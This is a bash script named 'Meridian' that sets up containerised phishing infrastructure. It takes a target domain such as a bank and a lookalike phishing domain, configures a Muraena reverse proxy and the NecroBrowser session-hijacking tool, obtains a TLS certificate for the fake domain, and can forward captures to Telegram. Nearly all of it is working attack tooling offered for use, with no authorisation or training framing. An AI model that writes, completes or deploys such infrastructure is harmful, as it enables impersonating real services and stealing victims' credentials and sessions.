#!/bin/bash
################################################################################
# MERIDIAN INTERACTIVE CONTAINERIZED DEPLOYMENT
# Prompts for configuration and deploys containerized phishing infrastructure
################################################################################

set -euo pipefail

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

# Configuration
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
CONFIG_DIR="$SCRIPT_DIR/config"
TEMPLATE_DIR="$CONFIG_DIR/templates"
GENERATED_DIR="$CONFIG_DIR/generated"
LOG_FILE="$SCRIPT_DIR/logs/deploy_$(date +%Y%m%d_%H%M%S).log"

# Create necessary directories
mkdir -p "$GENERATED_DIR" "$SCRIPT_DIR/logs" "$SCRIPT_DIR/ssl"

################################################################################
# LOGGING FUNCTIONS
################################################################################

log() {
    local level="$1"
    shift
    local message="$*"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    case "$level" in
        INFO)    echo -e "${CYAN}[INFO]${NC} $message" ;;
        SUCCESS) echo -e "${GREEN}[✓]${NC} $message" ;;
        WARN)    echo -e "${YELLOW}[⚠]${NC} $message" ;;
        ERROR)   echo -e "${RED}[✗]${NC} $message" ;;
        STEP)    echo -e "${BOLD}${BLUE}[→]${NC} $message" ;;
        INPUT)   echo -e "${CYAN}[?]${NC} $message" ;;
    esac
    
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE" 2>/dev/null || true
}

banner() {
    clear
    cat << 'EOF'
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           🌊 MERIDIAN CONTAINERIZED DEPLOYMENT 🌊             ║
║                                                               ║
║        Interactive Setup for Phishing Infrastructure          ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
EOF
    echo ""
}

################################################################################
# INPUT VALIDATION FUNCTIONS
################################################################################

validate_domain() {
    local domain="$1"
    if [[ ! "$domain" =~ ^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
        return 1
    fi
    return 0
}

validate_email() {
    local email="$1"
    if [[ ! "$email" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
        return 1
    fi
    return 0
}

validate_port() {
    local port="$1"
    if [[ ! "$port" =~ ^[0-9]+$ ]] || [ "$port" -lt 1 ] || [ "$port" -gt 65535 ]; then
        return 1
    fi
    return 0
}

################################################################################
# USER INPUT COLLECTION
################################################################################

collect_user_inputs() {
    log STEP "Configuration Setup"
    echo ""
    
    # Target Domain
    while true; do
        log INPUT "Enter the TARGET domain (e.g., example.com, bank.com):"
        read -r TARGET_DOMAIN
        if validate_domain "$TARGET_DOMAIN"; then
            log SUCCESS "Target domain: $TARGET_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Phishing Domain
    while true; do
        log INPUT "Enter the PHISHING domain (e.g., examp1e.com, bankk.com):"
        read -r PHISHING_DOMAIN
        if validate_domain "$PHISHING_DOMAIN"; then
            log SUCCESS "Phishing domain: $PHISHING_DOMAIN"
            break
        else
            log ERROR "Invalid domain format. Please try again."
        fi
    done
    echo ""
    
    # Target Subdomains
    log INPUT "Enter target subdomains (comma-separated, or press Enter to skip):"
    log INFO "Example: www.${TARGET_DOMAIN},api.${TARGET_DOMAIN}"
    read -r SUBDOMAINS_INPUT
    
    if [ -n "$SUBDOMAINS_INPUT" ]; then
        IFS=',' read -ra SUBDOMAINS <<< "$SUBDOMAINS_INPUT"
        TARGET_SUBDOMAIN_1="${SUBDOMAINS[0]:-www.${TARGET_DOMAIN}}"
        TARGET_SUBDOMAIN_2="${SUBDOMAINS[1]:-api.${TARGET_DOMAIN}}"
    else
        TARGET_SUBDOMAIN_1="www.${TARGET_DOMAIN}"
        TARGET_SUBDOMAIN_2="api.${TARGET_DOMAIN}"
    fi
    log SUCCESS "Subdomains configured"
    echo ""
    
    # SSL Configuration
    log INPUT "SSL Certificate Setup:"
    echo "  1) Let's Encrypt (automatic, requires valid DNS)"
    echo "  2) Self-signed (for testing)"
    echo "  3) Custom (provide your own certificates)"
    read -p "Select option [1-3]: " SSL_CHOICE
    
    case "$SSL_CHOICE" in
        1)
            SSL_MODE="letsencrypt"
            while true; do
                log INPUT "Enter email for Let's Encrypt:"
                read -r LETSENCRYPT_EMAIL
                if validate_email "$LETSENCRYPT_EMAIL"; then
                    log SUCCESS "Email: $LETSENCRYPT_EMAIL"
                    break
                else
                    log ERROR "Invalid email format. Please try again."
                fi
            done
            ;;
        2)
            SSL_MODE="selfsigned"
            LETSENCRYPT_EMAIL=""
            log SUCCESS "Self-signed certificate will be generated"
            ;;
        3)
            SSL_MODE="custom"
            LETSENCRYPT_EMAIL=""
            log INFO "Place your certificates in ./ssl/ directory:"
            log INFO "  - fullchain.pem"
            log INFO "  - privkey.pem"
            ;;
        *)
            SSL_MODE="selfsigned"
            log WARN "Invalid choice. Using self-signed certificate."
            ;;
    esac
    echo ""
    
    # Redis Password
    log INPUT "Enter Redis password (or press Enter for auto-generated):"
    read -r REDIS_PASSWORD
    if [ -z "$REDIS_PASSWORD" ]; then
        REDIS_PASSWORD="meridian_$(openssl rand -hex 16)"
        log SUCCESS "Generated Redis password"
    else
        log SUCCESS "Redis password set"
    fi
    echo ""
    
    # Telegram Notifications (Optional)
    log INPUT "Enable Telegram notifications? (y/N):"
    read -r TELEGRAM_CHOICE
    
    if [[ "$TELEGRAM_CHOICE" =~ ^[Yy]$ ]]; then
        TELEGRAM_ENABLED="true"
        log INPUT "Enter Telegram Bot Token:"
        read -r TELEGRAM_BOT_TOKEN
        log INPUT "Enter Telegram Chat IDs (comma-separated):"
        read -r TELEGRAM_CHAT_IDS_INPUT
        TELEGRAM_CHAT_IDS=$(echo "$TELEGRAM_CHAT_IDS_INPUT" | sed 's/,/", "/g' | sed 's/^/"/' | sed 's/$/"/')
        log SUCCESS "Telegram notifications enabled"
    else
        TELEGRAM_ENABLED="false"
        TELEGRAM_BOT_TOKEN=""
        TELEGRAM_CHAT_IDS=""
        log INFO "Telegram notifications disabled"
    fi
    echo ""
    
    # Campaign Name
    log INPUT "Enter campaign name (or press Enter for auto-generated):"
    read -r CAMPAIGN_NAME
    if [ -z "$CAMPAIGN_NAME" ]; then
        CAMPAIGN_NAME="campaign_$(date +%Y%m%d_%H%M%S)"
        log SUCCESS "Generated campaign name: $CAMPAIGN_NAME"
    else
        log SUCCESS "Campaign name: $CAMPAIGN_NAME"
    fi
    echo ""
}

################################################################################
# CONFIGURATION GENERATION
################################################################################

generate_env_file() {
    log STEP "Generating .env file..."
    
    cat > "$SCRIPT_DIR/.env" << EOF
# Meridian Deployment Configuration
# Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Domain Configuration
PHISHING_DOMAIN=${PHISHING_DOMAIN}
TARGET_DOMAIN=${TARGET_DOMAIN}
TARGET_SUBDOMAIN_1=${TARGET_SUBDOMAIN_1}
TARGET_SUBDOMAIN_2=${TARGET_SUBDOMAIN_2}

# SSL Configuration
LETSENCRYPT_EMAIL=${LETSENCRYPT_EMAIL}
SSL_MODE=${SSL_MODE}

# Redis Configuration
REDIS_PASSWORD=${REDIS_PASSWORD}

# Service Ports
MURAENA_HTTP_PORT=80
MURAENA_HTTPS_PORT=443
NECRO_API_PORT=3000
REDIS_PORT=6379
WEB_PANEL_PORT=8080

# Telegram Notifications
TELEGRAM_ENABLED=${TELEGRAM_ENABLED}
TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}
TELEGRAM_CHAT_IDS=${TELEGRAM_CHAT_IDS}

# Deployment Metadata
CAMPAIGN_NAME=${CAMPAIGN_NAME}
DEPLOY_DATE=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
DEPLOY_USER=${USER}
EOF
    
    log SUCCESS ".env file created"
}

generate_muraena_config() {
    log STEP "Generating Muraena configuration..."
    
    # Use template if exists, otherwise create basic config
    if [ -f "$TEMPLATE_DIR/muraena_config.toml.template" ]; then
        sed -e "s|{{PHISHING_DOMAIN}}|${PHISHING_DOMAIN}|g" \
            -e "s|{{TARGET_DOMAIN}}|${TARGET_DOMAIN}|g" \
            -e "s|{{TARGET_SUBDOMAIN_1}}|${TARGET_SUBDOMAIN_1}|g" \
            -e "s|{{TARGET_SUBDOMAIN_2}}|${TARGET_SUBDOMAIN_2}|g" \
            -e "s|{{REDIS_PASSWORD}}|${REDIS_PASSWORD}|g" \
            -e "s|{{TELEGRAM_ENABLED}}|${TELEGRAM_ENABLED}|g" \
            -e "s|{{TELEGRAM_BOT_TOKEN}}|${TELEGRAM_BOT_TOKEN}|g" \
            -e "s|{{TELEGRAM_CHAT_IDS}}|${TELEGRAM_CHAT_IDS}|g" \
            "$TEMPLATE_DIR/muraena_config.toml.template" > "$GENERATED_DIR/muraena_config.toml"
    else
        # Create basic config if template doesn't exist
        cat > "$GENERATED_DIR/muraena_config.toml" << EOF
[proxy]
    phishing = "${PHISHING_DOMAIN}"
    destination = "${TARGET_DOMAIN}"
    IP = "0.0.0.0"
    port = 443
    
    [proxy.HTTPtoHTTPS]
    enable = true
    HTTPport = 80

[redis]
    host = "redis"
    port = 6379
    password = "${REDIS_PASSWORD}"

[tls]
    enable = true
    certificate = "./ssl/fullchain.pem"
    key = "./ssl/privkey.pem"

[log]
    enable = true
    filePath = "logs/muraena.log"

[tracking]
    enable = true

[necrobrowser]
    enable = true
    endpoint = "http://necrobrowser:3000/instrument"
EOF
    fi
    
    log SUCCESS "Muraena config created: $GENERATED_DIR/muraena_config.toml"
}

generate_necrobrowser_config() {
    log STEP "Generating NecroBrowser configuration..."
    
    if [ -f "$TEMPLATE_DIR/necrobrowser_config.json.template" ]; then
        sed -e "s|{{TARGET_DOMAIN}}|${TARGET_DOMAIN}|g" \
            -e "s|{{REDIS_PASSWORD}}|${REDIS_PASSWORD}|g" \
            "$TEMPLATE_DIR/necrobrowser_config.json.template" > "$GENERATED_DIR/necrobrowser_config.json"
    else
        cat > "$GENERATED_DIR/necrobrowser_config.json" << EOF
{
  "redis": {
    "host": "redis",
    "port": 6379,
    "password": "${REDIS_PASSWORD}"
  },
  "api": {
    "port": 3000,
    "host": "0.0.0.0"
  },
  "browser": {
    "headless": true,
    "args": ["--no-sandbox", "--disable-setuid-sandbox"]
  },
  "targets": {
    "domain": "${TARGET_DOMAIN}"
  },
  "logging": {
    "enabled": true,
    "path": "/app/logs/necrobrowser.log"
  }
}
EOF
    fi
    
    log SUCCESS "NecroBrowser config created: $GENERATED_DIR/necrobrowser_config.json"
}

################################################################################
# SSL CERTIFICATE SETUP
################################################################################

setup_ssl_certificates() {
    log STEP "Setting up SSL certificates..."
    
    case "$SSL_MODE" in
        letsencrypt)
            setup_letsencrypt
            ;;
        selfsigned)
            generate_selfsigned_cert
            ;;
        custom)
            verify_custom_certs
            ;;
    esac
}

setup_letsencrypt() {
    log INFO "Obtaining Let's Encrypt certificate for $PHISHING_DOMAIN..."
    
    # Check if certbot is installed
    if ! command -v certbot &> /dev/null; then
        log INFO "Installing certbot..."
        sudo apt-get update -qq
        sudo apt-get install -y certbot
    fi
    
    # Stop any services using ports 80/443
    docker-compose down 2>/dev/null || true
    
    # Obtain certificate
    sudo certbot certonly --standalone \
        --non-interactive \
        --agree-tos \
        --email "$LETSENCRYPT_EMAIL" \
        -d "$PHISHING_DOMAIN" \
        --cert-path "$SCRIPT_DIR/ssl/fullchain.pem" \
        --key-path "$SCRIPT_DIR/ssl/privkey.pem"
    
    if [ $? -eq 0 ]; then
        sudo cp "/etc/letsencrypt/live/$PHISHING_DOMAIN/fullchain.pem" "$SCRIPT_DIR/ssl/"
        sudo cp "/etc/letsencrypt/live/$PHISHING_DOMAIN/privkey.pem" "$SCRIPT_DIR/ssl/"
        sudo chown -R $USER:$USER "$SCRIPT_DIR/ssl"
        chmod 600 "$SCRIPT_DIR/ssl"/*.pem
        log SUCCESS "Let's Encrypt certificate obtained"
    else
        log ERROR "Failed to obtain certificate. Falling back to self-signed."
        generate_selfsigned_cert
    fi
}

generate_selfsigned_cert() {
    log INFO "Generating self-signed certificate..."
    
    openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
        -keyout "$SCRIPT_DIR/ssl/privkey.pem" \
        -out "$SCRIPT_DIR/ssl/fullchain.pem" \
        -subj "/C=US/ST=State/L=City/O=Organization/CN=${PHISHING_DOMAIN}"
    
    chmod 600 "$SCRIPT_DIR/ssl"/*.pem
    log SUCCESS "Self-signed certificate generated"
}

verify_custom_certs() {
    log INFO "Verifying custom certificates..."
    
    if [ ! -f "$SCRIPT_DIR/ssl/fullchain.pem" ] || [ ! -f "$SCRIPT_DIR/ssl/privkey.pem" ]; then
        log ERROR "Custom certificates not found in ./ssl/"
        log INFO "Generating self-signed certificate instead..."
        generate_selfsigned_cert
    else
        log SUCCESS "Custom certificates found"
    fi
}

################################################################################
# DOCKER DEPLOYMENT
################################################################################

update_docker_compose() {
    log STEP "Updating docker-compose.yml with generated configs..."
    
    # Update volume mounts to use generated configs
    sed -i.bak \
        -e "s|./config/muraena_config.toml|./config/generated/muraena_config.toml|g" \
        -e "s|./config/necrobrowser_config.json|./config/generated/necrobrowser_config.json|g" \
        "$SCRIPT_DIR/docker-compose.yml"
    
    log SUCCESS "docker-compose.yml updated"
}

deploy_containers() {
    log STEP "Deploying containerized services..."
    
    cd "$SCRIPT_DIR"
    
    # Pull latest images
    log INFO "Pulling base images..."
    docker-compose pull redis nginx 2>/dev/null || true
    
    # Build custom images
    log INFO "Building Muraena and NecroBrowser images..."
    docker-compose build --no-cache
    
    # Start services
    log INFO "Starting services..."
    docker-compose up -d
    
    # Wait for services to be healthy
    log INFO "Waiting for services to be healthy..."
    sleep 15
    
    log SUCCESS "Services deployed"
}

################################################################################
# POST-DEPLOYMENT
################################################################################

show_deployment_summary() {
    echo ""
    log SUCCESS "Deployment Complete!"
    echo ""
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║                    DEPLOYMENT SUMMARY                         ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo ""
    echo "Campaign Name:     $CAMPAIGN_NAME"
    echo "Phishing Domain:   https://$PHISHING_DOMAIN"
    echo "Target Domain:     https://$TARGET_DOMAIN"
    echo "SSL Mode:          $SSL_MODE"
    echo ""
    echo "Service Endpoints:"
    echo "  - Muraena HTTP:   http://$(hostname -I | awk '{print $1}'):80"
    echo "  - Muraena HTTPS:  https://$(hostname -I | awk '{print $1}'):443"
    echo "  - NecroBrowser:   http://$(hostname -I | awk '{print $1}'):3000"
    echo "  - Web Panel:      http://$(hostname -I | awk '{print $1}'):8080"
    echo "  - Redis:          $(hostname -I | awk '{print $1}'):6379"
    echo ""
    echo "Configuration Files:"
    echo "  - Environment:    .env"
    echo "  - Muraena:        config/generated/muraena_config.toml"
    echo "  - NecroBrowser:   config/generated/necrobrowser_config.json"
    echo ""
    echo "Logs:"
    echo "  - Deployment:     $LOG_FILE"
    echo "  - Muraena:        docker-compose logs muraena"
    echo "  - NecroBrowser:   docker-compose logs necrobrowser"
    echo ""
    echo "Management Commands:"
    echo "  - View status:    docker-compose ps"
    echo "  - View logs:      docker-compose logs -f"
    echo "  - Stop services:  docker-compose down"
    echo "  - Restart:        docker-compose restart"
    echo ""
    
    if [ "$TELEGRAM_ENABLED" = "true" ]; then
        echo "Telegram notifications: ENABLED"
        echo ""
    fi
    
    log WARN "IMPORTANT: Ensure DNS for $PHISHING_DOMAIN points to this server!"
    echo ""
}

verify_deployment() {
    log STEP "Verifying deployment..."
    
    # Check if containers are running
    local running=$(docker-compose ps --services --filter "status=running" | wc -l)
    local total=$(docker-compose ps --services | wc -l)
    
    if [ "$running" -eq "$total" ]; then
        log SUCCESS "All $total services are running"
    else
        log WARN "$running/$total services are running"
        log INFO "Check logs with: docker-compose logs"
    fi
    
    # Test local connectivity
    if curl -s -o /dev/null -w "%{http_code}" http://localhost | grep -q "200\|301\|302"; then
        log SUCCESS "HTTP endpoint responding"
    else
        log WARN "HTTP endpoint not responding"
    fi
    
    # Test HTTPS
    if curl -sk -o /dev/null -w "%{http_code}" https://localhost | grep -q "200\|301\|302"; then
        log SUCCESS "HTTPS endpoint responding"
    else
        log WARN "HTTPS endpoint not responding (may need DNS configured)"
    fi
    
    # Test Redis
    if docker-compose exec -T redis redis-cli -a "$REDIS_PASSWORD" ping 2>/dev/null | grep -q "PONG"; then
        log SUCCESS "Redis is responding"
    else
        log WARN "Redis not responding"
    fi
    
    # Test NecroBrowser
    if curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/health 2>/dev/null | grep -q "200"; then
        log SUCCESS "NecroBrowser API is responding"
    else
        log WARN "NecroBrowser API not responding"
    fi
}

################################################################################
# CLEANUP AND ERROR HANDLING
################################################################################

cleanup() {
    log INFO "Cleaning up..."
    # Remove backup files
    rm -f "$SCRIPT_DIR/docker-compose.yml.bak" 2>/dev/null || true
}

handle_error() {
    local exit_code=$?
    log ERROR "Deployment failed with exit code $exit_code"
    log ERROR "Check log file: $LOG_FILE"
    cleanup
    exit $exit_code
}

################################################################################
# MAIN EXECUTION
################################################################################

main() {
    # Set up error handling
    trap handle_error ERR
    trap cleanup EXIT
    
    # Display banner
    banner
    
    # Check prerequisites
    log STEP "Checking prerequisites..."
    
    if ! command -v docker &> /dev/null; then
        log ERROR "Docker is not installed. Please install Docker first."
        exit 1
    fi
    
    if ! command -v docker-compose &> /dev/null; then
        log ERROR "docker-compose is not installed. Please install docker-compose first."
        exit 1
    fi
    
    if ! docker info &> /dev/null; then
        log ERROR "Docker daemon is not running. Please start Docker."
        exit 1
    fi
    
    log SUCCESS "Prerequisites satisfied"
    echo ""
    
    # Collect user configuration
    collect_user_inputs
    
    # Show configuration summary before proceeding
    echo ""
    log STEP "Configuration Summary:"
    echo "  Target Domain:     $TARGET_DOMAIN"
    echo "  Phishing Domain:   $PHISHING_DOMAIN"
    echo "  SSL Mode:          $SSL_MODE"
    echo "  Campaign Name:     $CAMPAIGN_NAME"
    echo "  Telegram:          $TELEGRAM_ENABLED"
    echo ""
    
    log INPUT "Proceed with deployment? (Y/n):"
    read -r CONFIRM
    if [[ "$CONFIRM" =~ ^[Nn]$ ]]; then
        log WARN "Deployment cancelled by user"
        exit 0
    fi
    echo ""
    
    # Generate configuration files
    generate_env_file
    generate_muraena_config
    generate_necrobrowser_config
    
    # Setup SSL certificates
    setup_ssl_certificates
    
    # Update docker-compose with generated configs
    update_docker_compose
    
    # Deploy containers
    deploy_containers
    
    # Verify deployment
    verify_deployment
    
    # Show summary
    show_deployment_summary
    
    log SUCCESS "Meridian deployment complete!"
}

# Run main function
main "$@"
